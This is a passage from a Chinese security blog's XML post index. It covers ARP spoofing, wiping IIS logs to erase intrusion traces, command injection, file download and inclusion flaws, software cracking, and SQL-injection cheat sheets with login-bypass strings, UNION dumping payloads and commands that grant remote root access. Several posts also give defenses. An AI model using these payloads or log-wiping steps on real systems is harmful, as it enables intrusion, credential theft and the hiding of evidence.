地址给机器，此机器就会存储起来以便日后使用。我们以主机a（192.168.1.5）向主机b（192.168.1.1）发送数据为例。当发送数据时，主机a会在自己的arp缓存表中寻找是否有目标IP地址。如果找到了，也就知道了目标mac地址，直接把目标mac地址写入帧里面发送就可以了；如果在arp缓存表中没有找到相对应的IP地址，主机a就会在网络上发送一个广播，目标mac地址是“ff.ff.ff.ff.ff.ff”，这表示向同一网段内的所有主机发出这样的询问：“192.168.1.1的mac地址是什么？”网络上其他主机并不响应arp询问，只有主机b接收到这个帧时，才向主机a做出这样的回应：“192.168.1.1的mac地址是00-aa-00-62-c6-09”。这样，主机a就知道了主机b的mac地址，它就可以向主机b发送信息了。同时它还更新了自己的arp缓存表，下次再向主机b发送信息时，直接从arp缓存表里查找就可以了。arp缓存表采用了老化机制，在一段时间内如果表中的某一行没有使用，就会被删除，这样可以大大减少arp缓存表的长度，加快查询速度。 ARP欺骗arp攻击就是通过伪造IP地址和mac地址实现arp欺骗，能够在网络中产生大量的arp通信量使网络阻塞，攻击者只要持续不断的发出伪造的arp响应包就能更改目标主机arp缓存中的ip-mac条目，造成网络中断或中间人攻击。arp攻击主要是存在于局域网网络中，局域网中若有一个人感染arp木马，则感染该arp木马的系统将会试图通过“arp欺骗”手段截获所在网络内其它计算机的通信信息，并因此造成网内其它计算机的通信故障。从影响网络连接通畅的方式来看，arp欺骗分为二种，一种是对路由器arp表的欺骗，另一种是对内网pc的网关欺骗。第一种arp欺骗的原理是：截获网关数据。它通知路由器一系列错误的内网mac地址，并按照一定的频率不断进行，使真实的地址信息无法通过更新保存在路由器中，结果路由器的所有数据只能发送给错误的mac地址，造成正常pc无法收到信息。第二种arp欺骗的原理是：伪造网关。它的原理是建立假网关，让被它欺骗的pc向假网关发数据，而不是通过正常的路由器途径上网。在pc看来，就是上不了网了，“网络掉线了”。 ARP攻击使用的工具为WinArpAttacker3.72.exe，该工具需要winpacp的支持。1.路由器ARP表的欺骗运行软件，options选择正确的网卡：局域网扫描，Scan-&gt;lan Scan：ip冲突：WinArpAttacker通过伪造此IP的数据包进行路由器arp表欺骗，这样，路由器返回的数据包就不能正常的返回给被攻击的主机，使其不能连接网络。 2.网关欺骗选择“attack”-&gt;“bangateway”进行网关欺骗：通过“网关欺骗”，会发送假的网关的MAC地址给主机保存，这样主机访问网络的数据包就不能经过真正的网关。 实际测试，效果并不理想，主机依旧可以访问互联网。/(ㄒoㄒ)/~~]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>ARP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IIS日志文件清除]]></title>
    <url>%2F2017%2F05%2F21%2FIIS%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E6%B8%85%E9%99%A4%2F</url>
    <content type="text"><![CDATA[郑重声明：本文介绍的内容只是为了让读者了解黑客攻击的一般原理和方法，从而加强网络安全的意识，并非让读者真正的成为危害网络及社会的黑客。由于读者利用本文介绍的某些方法和工具对网络或别人的系统造成了危害或严重后果，作者不负任何责任。由此带来的一切法律后果由使用者自负。 IIS日志的基本介绍默认位置：%systemroot%system32/logfiles，存放位置可自由设置。默认日志格式：ex+年份的末两位数字+月份+日期文件后缀：.log如2010年7月30日的日志生成文件是ex100730.logIIS日志是每个服务器管理者都必须学会查看的，服务器的一些状况和访问IP的来源都会记录在IIS日志中，所以IIS日志对每个服务器管理者非常的重要。注意，IIS服务在运行过程中，日志服务也在运行，日志文件是无法删除的，需要先停止日志服务才行，所以删除IIS日志，建议使用专门的IIS日志清除工具来删除。 日志文件夹以“W3SVC”进行命名，如果有多个网站目录，则会存在多个“W3SVC”目录： 使用的到的工具为cleanIISlog.exe，使用方法：命令行中输入：cleanIISlog.exe “日志文件地址” “ip地址”：示例：CleanIISLog.exe C:\WINDOWS\system32\Logfiles\W3SVC1\ex130222.log 127.0.0.1可以看到程序会首先停止日志服务。再次打开日志文件，删除成功： 总结：本文通过CleanIISLog软件来修改日志文件中的内容，尤其是清除IP地址以及文件名称尤为有用，清除后，日志文件依然存在，管理员从IIS日志文件中再也找不出入侵者的“蛛丝马迹”了。 手动清除IIS日志首先停止日志服务：1net stop w3svc 然后删除日志文件，接着启动日志服务：1net start w3svc]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>IIS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IIS的安全设置和加固]]></title>
    <url>%2F2017%2F05%2F21%2FIIS%E7%9A%84%E5%AE%89%E5%85%A8%E8%AE%BE%E7%BD%AE%E5%92%8C%E5%8A%A0%E5%9B%BA%2F</url>
    <content type="text"><![CDATA[概述Web服务器直接与Internet相连，而Windows服务器一般提供Web服务的就是IIS，所以IIS自身的安全性至关重要。 最小安装原则在IIS安装过程中，根据具体的业务需求，只安装必要的组件，以避免安装其他一切不必要的组件带来的安全风险。如网站正常运行只需要ASP环境，那我们就没必要安装.net组件。 删除默认站点关闭并删除默认FTP站点，默认Web站点等默认的东西，一般也不建议在默认站点上建立自己地站点。 禁用不必要的Web扩展检查是否有不必要的Web服务扩展，禁用掉不需要用到的。 站点文件不要放在系统盘新站点的网站文件，不要放在系统盘，要放在其他分区里。 IIS访问权限设置如果IIS中有多个网站，建议为每个网站配置不同的匿名访问账户。新建一个账号test，加入Guests组。12net user test test /addnet localgroup guests test /add 在“网站属性”—&gt;“目录安全性”—&gt;“身份验证和访问控制”，把“启用匿名访问”处，用刚新建的账户代替默认账户，如下图： 网站目录权限配置网站目录权限配置也是很重要的一部分，某些目录有写入权限，一定不要分配执行权限；某些目录有执行权限，一定不要分配写入权限；网站上传目录和数据库目录一般需要分配“写入”权限，但一定不要分配执行权限；其他目录一般只分配“读取”和“记录访问”权限即可。某些需要保存用户上传的图片等目录，必须在执行权限里设为无，否则上传的木马文件或者变形木马都有可能被调用执行。 只保留必要的应用程序扩展根据网站的实际情况，只保留必要的应用程序扩展，其他的一律删除，尤其是像cer、asa这样极其危险的扩展，而且一般网站也不需要它。属性-&gt;主目录-&gt;执行权限右边的配置： 日志文件配置无论是什么服务器，日志都是应该高度重视的部分。当发生安全事件时，我们可以通过分析日志来还原攻击过程，否则将无从查起。有条件的话，可以将日志发送到专门的日志服务器保存。先检查是否启用了日志记录，如未启用，则启用它。日志格式设置为W3C扩展日志格式，IIS中默认是启用日志记录的。接着修改IIS日志文件保存路径，默认保存在“C:\WINDOWS\system32\LogFiles”目录下，这里修改为自定义路径。建议保存在非系统盘路径，并且IIS日志文件所在目录只允许Administrators组用户和SYSTEM用户访问。 防止信息泄露禁止向客户端发送详细的ASP错误信息可以在“IIS管理器”—&gt;“属性”—&gt;“主目录”—&gt;“配置”—&gt;“调试”，选择“向客户端发送下列文本错误消息”项，自定义出错时返回的错误信息。 修改默认错误页面“IIS管理器”—&gt;“属性”—&gt;“自定义错误”，用自定义的错误页面替换默认的默认页面。 自定义IIS Banner信息默认Banner信息会泄露服务器类型、版本等相关信息，我们需要对其进修改，这样可以防止信息泄露，还可以骗过一些自动化扫描、攻击工具。修改默认HTTP头信息方法：]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>IIS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[OS命令注入]]></title>
    <url>%2F2017%2F05%2F20%2FOS%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[原理OS命令注入漏洞，体现在很多方面。命令连接符号可以起到很大的作用，如果语句没有筛选直接进行执行系统常规命令，可以用“||”等连接符进行命令拼接，从而执行用户输入的命令。 测试某网络设备：点击Summit之后，可以看到返回的结果。将“127.0.0.1”替换为“||ifconfig”可在输出结果中查看到当前系统的网卡信息。通过如图返回的结果信息可知该处可注入并执行操作系统命令。]]></content>
      <categories>
        <category>系统安全</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[短信验证码安全]]></title>
    <url>%2F2017%2F05%2F20%2F%E7%9F%AD%E4%BF%A1%E9%AA%8C%E8%AF%81%E7%A0%81%E5%AE%89%E5%85%A8%2F</url>
    <content type="text"><![CDATA[此类漏洞归为逻辑漏洞。 任意用户密码重置以下图APP为例，点击APP中的忘记密码：点击重置按钮之后，APP会将验证码、新密码（可能经过MD5加密）、手机号码（APP已经保存的手机号码）发送给服务器，服务器判断验证码成功之后，将数据包中的手机号码的密码修改为新密码，如上图所示，提交的主要参数有：验证码、手机号码、新密码。抓包：可能存在的问题：1.验证码只有4位或者6位，服务器端未对验证次数做限制，导致验证码能够被暴力破解；（验证码暴力破解）2.mobile参数能够被操作，用手机号码A成功获取到验证码之后，攻击者可以操作参数mobile，将它修改为手机号码B，这样能够在用户B完全不知情的情况下，修改B的密码。 （手机A接收验证码，重置手机B的密码） 另一种情况：1.对第一步进行抓包，输入手机号，随便填写验证码，发送给服务器，截取服务器返回的数据包，修改返回的状态码（”0”改为”1”，或者”1”改为”0”），达到绕过验证码的效果，进入修改密码界面。（验证码绕过）2.对第二步进行抓包，修改mobile参数，改为其他用户的手机号码，能够达到在其他用户完全不知情的情况下，修改他们的密码，类似于a中的第二种。（手机A接收验证码，重置手机B的密码） 总结：测试的时候，需要测试如下几项：a.验证码是否能够被暴力破解；b.验证码绕过；c.重置密码时，是否有mobile参数，如果有，是否能够通过修改该参数的方法，达到手机A接收验证码，重置手机B的密码的效果。d.获取验证码之后，服务器会将验证码回传给APP，APP中再将用户输入的短信中的验证码进行比较。有些APP，验证码会直接明文显示在返回的数据包中： 防御方法：1.接收验证码的邮箱和手机号不可由用户控制，应该直接从数据库中读取出来；2.加强验证凭证复杂度，防止被暴力破解；3.限制验证凭证错误次数，单个用户在半小时内验证码错误三次，半小时内禁止找回密码；4.验证凭证失效时间；5.验证凭证不要保存在页面；6.输入用户邮箱或者手机号取验证码的地方需要注意，防止短信炸弹和批量找回；7.验证凭证跟用户名、用户ID、用户邮箱绑定，找回密码时验证当前凭证是否是当前用户的。8.每个号码，每天能接受的验证码条数做限制，防止被短信轰炸机利用。 任意账号注册类似于任意用户密码重置，主要是再次提交数据的时候，用户的手机号能够修改，且服务器端未再次验证手机号是否为之前获取验证码的手机号。1.使用手机号133*887注册某个APP，获取验证码46908；2.在确认提交时，拦截请求，修改注册的手机号码，即可注册任意账号，这里修改为1338*678（任意手机号）；3.分别使用133*887和133*678（任意手机号）登录，均可以通过验证登录，看到最终结果。 整改建议：注册过程最后的确认提交时，服务器应验证提交的账号是否是下发验证码的手机号。]]></content>
      <categories>
        <category>移动安全</category>
      </categories>
      <tags>
        <tag>验证码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSRF跨站请求伪造]]></title>
    <url>%2F2017%2F05%2F20%2FCSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%2F</url>
    <content type="text"><![CDATA[原理跨站请求伪造（CSRF）与跨站脚本(XSS)非常相似, 只有一个非常重要的不同之处：XSS利用客户端的弱点，而CSRF利用的是网站服务器的弱点。按照OWASP, “一个CSRF袭击迫使某个登录的浏览器向易受攻击的Web应用发送一个请求，然后以受害者的名义，为入侵者的利益进行所选择的行动”。这段描述的关键部分是“强迫已登录的”受害者发送请求。攻击者利用网站对目标用户的信任，这意味着如果攻击取得成功，攻击者就能代表用户执行以下行为：1、购买商品;2、转账;3、运行恶意软件，留下很少或不留下查明真实攻击者的痕迹;4、进行股票交易;5、订阅在线服务等。]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>CSRF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[任意文件下载漏洞]]></title>
    <url>%2F2017%2F05%2F20%2F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[产生原因一般网站都提供下载文件功能，常见的实现方法是使用一个动态页面（php、jsp、aspx、asp等）将待下载文件作为参数，一般参数名称为filename，如download.php?filename=xxx等。一般实现过程是，在根据参数filename的值，获得该文件在网站上的绝对路径，读取文件，然后是直接发送给客户端下载。如果没有对传入的参数filename进行过滤，就可以实现下载服务任何文件，产生任意文件下载漏洞。 测试步骤假如rul如下：http://www.xxx.com/download.php?filename=hello.doc尝试下载下载页面的源码（配合“../”）：http://www.xxx.com/download.php?filename=../../download.php 利用方法该漏洞不像其他漏洞那样有通用的利用方法和相关工具，本漏洞的利用过程与具体的网站架构关系很大，需要了解常见的网站的架构，如网站的配置文件位置等信息。1.jsp站点尝试下载tomcat-users.xml文件，里面保存了管理Tomcat的账号密码，该文件在：Tomcat安装目录/conf/tomcat-users.xml，下载该文件之后，就能获取管理员账号密码，然后登陆管理后台，部署带有木马文件的war包。2.aspx站点aspx站点一般后台都是SQL Server数据库，因此利用该漏洞的最简单的方法是下载网站根目录下的web.config文件，该文件中一般含有数据库的用户名和密码。3.asp站点一般的asp站点都是Access数据库，而Access数据库可以直接下载，因此利用该漏洞比较简便的方法就是直接下载Access数据库，找到管理员密码登陆后台，利用后台的上传功能，上传shell。首先目的是找到数据库文件名以及存放的路径。找到网站与数据库操作的动态页面，动态页面中一般使用include包含连接数据库的配置文件。一般网站的管理后台页面会包含这个信息，所以可以使用任意文件下载漏洞下载管理后台页面，例如admin.asp/mamage.asp等。在这些文件中一般会写有数据库文件的路径以及文件名。直接下载数据库文件可能下载不了，因为管理员一般会做限制，禁止直接下载mdb文件，可以使用任意文件下载漏洞来下载数据库文件。4.php站点php一般是使用MySQL数据库， 一般MySQL数据库禁止远程连接，但是可以使用phpMyAdmin进行管理。同意，尝试下载数据库连接文件，conf/config.php等等，获取数据库账户密码之后，如果是root权限，在知道网站绝对路径的情况下，尝试直接写入一句话木马。 漏洞修复从上面的利用过程可以看出，在使用该漏洞进行渗透过程中，需要利用到路径回溯符../跳出程序本身的限制目录实现下载任意文件，因此只要在下载前对传入的参数进行过滤，直接将..替换成空，就可以简单实现防范的目的。当然最好还是可以对待下载文件类型进行检查，判断是否允许下载类型。]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>文件下载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php文件包含漏洞]]></title>
    <url>%2F2017%2F05%2F20%2Fphp%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[文件包含的分类本地文件包含LFI main.php?page=1.jpg，需要allow_url_fopen开启，默认是开启的远程文件包含RFI main.php?page=http://www.xxx.com/xxx/1.jpg 需要allow_url_include = On 只要是符合php语法的文件，无论什么扩展名，他都会被当成php文件来执行。 php包含日志文件当某个PHP文件存在本地包含漏洞，而却无法上传正常文件，这就意味这有包含漏洞却不能拿来利用，这时攻击者就有可能会利用apache日志文件来入侵。Apache服务器运行后会生成两个日志文件，这两个文件是access.log（访问日志）和error.log（错误日志），Apache的日志文件记录了服务器对每次请求做出响应的有关信息，例如当我们请求x.php页面时，Apache就会记录下我们的操作，并且写到访问日志文件access.log之中：尝试将一句话木马或者是phpinfo写入到log文件中，访问如下地址：http://localhost/dashboard/&lt;?php phpinfo();?&gt;，效果如下：尖括号和空格被转码，而这样是无法利用的，尝试使用burpsuite抓包修改访问的url地址：查看access.log文件，可以看到没有被转码：最后本地包含access.log文件即可。可以尝试将一句话木马写入到文件中。 常见的日志位置文件如下：12345678 ../../../../../../../../../../var/log/httpd/access_log ../../../../../../../../../../var/log/httpd/error_log ../apache/logs/error.log ../apache/logs/access.log ../../apache/logs/error.log ../../apache/logs/access.log ../../../apache/logs/error.log ../../../apache/logs/access.log include和require的区别1.PHP程序执行到require（）时，只会读取一次档案，故常放在程序开头，档案引入后PHP会将网页档重新编译，让引入档成为原先网页的一部分。2.PHP程序执行到include（）时，每次皆会读取档案，故常用于流程控制的区段，如条件判断或循环中。3.require():无条件包含，如果文件不存在，会报出一个fatal error，脚本停止执行。4.include():有条件包含，如果文件不存在，会给出一个 warning，但脚本会继续执行。5.推荐使用require_once()和include_once()，可以检测文件是否有重复包含。]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于MS17-010漏洞的整理]]></title>
    <url>%2F2017%2F05%2F17%2F%E5%85%B3%E4%BA%8EMS17-010%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%95%B4%E7%90%86%2F</url>
    <content type="text"><![CDATA[MS17-010漏洞描述：如果攻击者向 Microsoft 服务器消息块SMB服务器发送经特殊设计的消息，则其中最严重的漏洞可能允许远程代码执行。受影响的系统：SMBv2漏洞(MS17-010)：Windows XP(32bit),Windows Server 2008 R2(32bit/64bit),Windows 7(32bit/64bit) SMB协议Server Message Block，服务器消息块，是一种协议名，smb服务的作用在于计算机间共享文件、打印机和串口等。SMB是应用在会话层和表示层以及小部分应用层的协议。SMB使用了NetBIOS的应用程序接口。另外，它是一个开放性的协议，允许协议扩展。SMB协议是基于TCP－NETBIOS协议的，使用的端口为139和445，在NetBIOS出现之后，Microsoft就使用NetBIOS实现了一个网络文件/打印服务系统，这个系统基于NetBIOS设定了一套文件共享协议，Microsoft称之为SMB（Server Message Block）协议。Windows系统均包括这个协议的客户端软件。 Samba服务Samba是在Linux和UNIX系统上实现SMB协议的一个免费软件，由服务器及客户端程序构成。工作流程：1.协议协商：客户端发送netprot指令包，包含smb类型等数据给服务器，服务器响应netprot数据包。2.建立连接：当smb确认之后，客户端发送session setup指令，提交账号密码，服务器端响应session setup数据包。3.客户端访问共享资源，发送tree connect指令包，服务器端响应。4.断开。 RDP协议远程桌面协议（RDP, Remote Desktop Protocol）是一个多通道（multi-channel）的协议，让用户（客户端或称“本地电脑”）连上提供微软终端机服务的电脑（服务器端或称“远程电脑”）。Windows几乎都有客户端所需软件：mstsc.exe。其他操作系统也有这些客户端软件，例如Linux、FreeBSD、Mac OS X。服务端电脑方面，则监听TCP3389端口的数据。 ICMP协议ICMP是（Internet Control Message Protocol）Internet控制报文协议。它是TCP/IP协议族的一个子协议，用于在IP主机、路由器之间传递控制消息。控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。这些控制消息虽然并不传输用户数据，但是对于用户数据的传递起着重要的作用。ICMP协议是一种面向无连接的协议，用于传输出错报告控制信息。从技术角度来说，ICMP就是一个“错误侦测与回报机制”，其目的就是让我们能够检测网路的连线状况﹐也能确保连线的准确性。]]></content>
      <categories>
        <category>系统安全</category>
      </categories>
      <tags>
        <tag>协议</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[内存补丁制作]]></title>
    <url>%2F2017%2F05%2F14%2F%E5%86%85%E5%AD%98%E8%A1%A5%E4%B8%81%E5%88%B6%E4%BD%9C%2F</url>
    <content type="text"><![CDATA[使用的工具为“注册机编写器”，菜单栏-&gt;其他-&gt;制作内存补丁。1.导入需要打补丁的程序；2.填写消息标题，启动提示等信息；3.添加补丁；找到要修改的地址，修改长度，输入原始指令和修改指令即可。4.点击生成补丁；注意，生成的补丁需要和源程序在同一目录才能执行。]]></content>
      <categories>
        <category>软件安全</category>
      </categories>
      <tags>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[各语言OEP大全]]></title>
    <url>%2F2017%2F05%2F14%2F%E5%90%84%E8%AF%AD%E8%A8%80OEP%E5%A4%A7%E5%85%A8%2F</url>
    <content type="text"><![CDATA[Delphi语言OEP特征 BC++ VB 汇编 VC++ 6.0 VC++ 7.0 易语言非独立编译 易语言独立编译]]></content>
      <categories>
        <category>软件安全</category>
      </categories>
      <tags>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[软件逆向方法总结]]></title>
    <url>%2F2017%2F05%2F13%2F%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[破解思路1.处理关键跳，查找关键字符串；2.寻找注册码；3.修改关键CALL的返回值；有的时候，程序很多地方都调用了一个关键CALL来判断程序是否注册，那我们只修改一个关键跳只能破解某一部分，要想全部破解，使用所有的功能，还需要修改关键CALL的返回值才行。方法：定位到关键CALL，F7跟进，如果关键CALL调用之后，修改的AL的值，那么直接将关键CALL中的内容替换为：mov eax，1（或者0），将结果翻转就行，下一行再加上：retn。 常见API断点1.GetStartupInfoA（取初始断点）加壳程序破解可以使用此断点，断点的意思是，在壳完成了解压缩，在程序初始化之前设置断点。 2.GetFileSize（获取文件大小）菜单栏-&gt;设置API断点-&gt;文件-&gt;GetFileSize由于一般的壳都有压缩功能，所以脱壳后的程序会比原来的大，如果程序有有文件大小校验功能，那么脱壳之后的程序就不能正常运行，需要破解文件大小校验的功能。 3.ReadFile（读文件）菜单栏-&gt;设置API断点-&gt;文件-&gt;ReadFile有些程序启动的时候就要求用户注册，用户输入用户名和注册码之后，提示重启软件，软件重启会读取一个配置文件，这个配置文件里存储的就是我们刚才输入的用户名和注册码。 4.MessageBoxA（消息窗）BP-&gt;BP MessageBoxA点击MessageBoxA，可以在程序中所有的弹窗处下断点。 5.GetPrivateProfileStringA（读取ini文件）BP-&gt;Archives INI-&gt;GetPrivateProfileStringA针对重启验证，读取INI配置文件的程序，可以使用该断点，可以使用这个方法来查找注册码。 6.万能断点参考软件按键事件中的万能断点。]]></content>
      <categories>
        <category>软件安全</category>
      </categories>
      <tags>
        <tag>OllyDebug</tag>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[万能口令漏洞分析]]></title>
    <url>%2F2017%2F05%2F10%2F%E4%B8%87%E8%83%BD%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[后台登陆界面程序在验证帐号密码的时候，可能的sql语句如下：12345a.select * from user where username='$username' and password='$password';b.select username,password from user where username='$username'; if(count() == 1)//如果查询到一行数据 if(password == $password) 登陆成功; 如果为语句a，可以尝试使用如下几种用户名登陆，而不需要输入正确的密码，输入任意字符的密码：123456x' or 1=1 #' select * from user where username='x' or 1=1 #'' and password='$password';x' or 1=1 /* select * from user where username='x' or 1=1 /*' and password='$password';x' or 1=1 -- select * from user where username='x' or 1=1 --' and password='$password';x' or '1'='1 select * from user where username='x' or '1'='1' and password='$password';x' or userid=1 #' select * from user where username='x' or userid=1 #'' and password='$password';admin' or 1=1 --(空格) userid需要猜对，可以使用id、uid等替换； 如果为语句b，可以先使用上面的方法，通过观察返回的提示，判断是否存在注入（提示密码输入错误，而不是用户名输入错误），然后可以尝试修改账户的密码：1x';update user set password='123456' where userid=1 #' 带入到语句b中：1select username,password from user where username='x';update user set password='123456' where userid=1 #''; 此种方法，需要猜对表名user、列名userid和password。如果不成功，可能的情况是：1.表名或者列名猜错；2.密码数据库中存储的密码并不是明文，而是经过加密处理，尝试将修改的密码’123456’进行md5加密之后再执行一次。 防御方法：1.加入防SQL注入的代码，或者部署WAF；2.php.ini中配置’magic_quotes_gpc’为’on’；3.使用addslashes()函数对输入的值进行过滤；]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[安全服务-应用安全测试项整理]]></title>
    <url>%2F2017%2F05%2F10%2F%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1-%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E6%95%B4%E7%90%86%2F</url>
    <content type="text"><![CDATA[1.万能口令测试2.SQL注入3.XSS跨站脚本4.文件上传漏洞5.凭证信息明文传输6.Struts2漏洞7.弱口令探测8.编辑器漏洞9.SVN源代码泄露漏洞10.后台新建任意文件11.越权访问12.目录遍历13.IIS短文件名泄露14.任意文件下载15.CMS版本识别，CMS漏洞16.验证码暴力破解17.Weblogic JAVA反序列化漏洞]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>等级保护</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL注入总结]]></title>
    <url>%2F2017%2F05%2F10%2FSQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[MySQL手工注入判断注入点是否存在数字型url后输入123http://www.xxx.cn/list.php?page=4&amp;id=524' 返回错误 http://www.xxx.cn/list.php?page=4&amp;id=524 and 1=1 返回正确http://www.xxx.cn/list.php?page=4&amp;id=524 and 1=2 返回错误 字符型url后输入123http://www.xxx.cn/list.php?page=4&amp;cid=x' 返回错误 http://www.xxx.cn/list.php?page=4&amp;cid=x' and 1=1 and '1'='1 返回正确http://www.xxx.cn/list.php?page=4&amp;cid=x' and 1=2 and '1'='1 返回错误 搜索型输入框中输入123' 返回错误x%' and 1=1 and '%'='% 返回正确x%' and 1=2 and '%'='% 返回错误 判断字段数数字型12http://www.xxx.cn/list.php?page=4&amp;id=524 order by 17 返回正确http://www.xxx.cn/list.php?page=4&amp;id=524 order by 18 返回错误 得出结论：字段数17。 字符型12http://www.xxx.cn/list.php?page=4&amp;cid=x' order by 17 # 返回正确http://www.xxx.cn/list.php?page=4&amp;cid=x' order by 18 # 返回错误 得出结论：字段数17。 搜索型12x%' order by 17 # 返回正确x%' order by 18 # 返回错误 得出结论：字段数17。 寻找可显示字段数字型1http://www.xxx.cn/list.php?page=4&amp;id=524 and 1=2 union select 1,2,3,4,5,6,7,8,9,.... 字符型1http://www.xxx.cn/list.php?page=4&amp;cid=x' and 1=2 union select 1,2,3,4,5,6,7,8,9,.... # 搜索型1x%' and 1=2 union select 1,2,3,4,5,6,7,8,9,.... # 查数据库名数字型1http://www.xxx.cn/list.php?page=4&amp;id=524 and 1=2 union select 1,2,database(),4,5,6,7,8,9,.... 字符型1http://www.xxx.cn/list.php?page=4&amp;cid=x' and 1=2 union select 1,2,database(),4,5,6,7,8,9,.... # 搜索型1x%' and 1=2 union select 1,2,database(),4,5,6,7,8,9,.... # 查数据库中表名数字型1http://www.xxx.cn/list.php?page=4&amp;id=524 and 1=2 union select 1,group_concat(table_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 from information_schema.tables where table_schema='数据库名' 数据库名也可以使用十六进制 字符型12http://www.xxx.cn/list.php?page=4&amp;id=x' and 1=2 union select 1,group_concat(table_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 from information_schema.tables where table_schema='数据库名' # 数据库名也可以使用十六进制 搜索型1小智%' and 1=2 union select 1,2,group_concat(table_name),4,5,6,7,8,9,.... from information_schema.tables where table_schema='数据库名' # 数据库名也可以使用十六进制 查表中的列名数字型1http://www.xxx.cn/list.php?page=4&amp;id=524 and 1=2 union select 1,group_concat(column_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 from information_schema.columns where table_name='表名' 表名也可以使用十六进制 字符型1http://www.xxx.cn/list.php?page=4&amp;id=x' and 1=2 union select 1,group_concat(column_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 from information_schema.columns where table_name='表名' # 表名也可以使用十六进制 搜索型12小智%' and 1=2 union select 1,2,group_concat(column_name),4,5,6,7,8,9,.... from information_schema.columns where table_name='表名' # 表名也可以使用十六进制 查表中的数据数字型1http://www.xxx.cn/list.php?page=4&amp;id=524 and 1=2 union select 1,group_concat(username,password),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 from 表名 字符型1http://www.xxx.cn/list.php?page=4&amp;id=x' and 1=2 union select 1,group_concat(username,password),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 from 表名 # 搜索型1x%' and 1=2 union select 1,2,group_concat(username,password),4,5,6,7,8,9,.... from 表名 # 12345678910显示版本：select version();显示字符集：select @@character_set_database;显示数据库show databases;显示表名：show tables;显示计算机名：select @@hostname;显示系统版本：select @@version_compile_os;显示mysql路径：select @@basedir;显示数据库路径：select @@datadir;显示root密码：select User,Password from mysql.user;开启外连：GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY '123456' WITH GRANT OPTION; SQL注入中的‘+’MSSQL：在MSSQL中，“+”运算符被用于字符串连接和加法运算，‘1’+‘1’=‘11’，1+1=2；MySQL：在MySQL中，“+”运算符只被用于加法运算，‘1’+‘1’=‘2’，1+1=2；Oracle：在Oracle中，“+”运算符只被用于加法运算，‘1’+‘1’=‘2’，1+1=2。 注释符1234MSSQL：‘-- ’(注意后面的空格)MySQL：‘-- ’,‘# ’,‘/*...*/’Oracle：‘-- ’,‘/*...*/’三种数据库中，通用的注释符是‘-- ’]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SVN源代码泄露漏洞]]></title>
    <url>%2F2017%2F05%2F10%2FSVN%E6%BA%90%E4%BB%A3%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%2F</url>
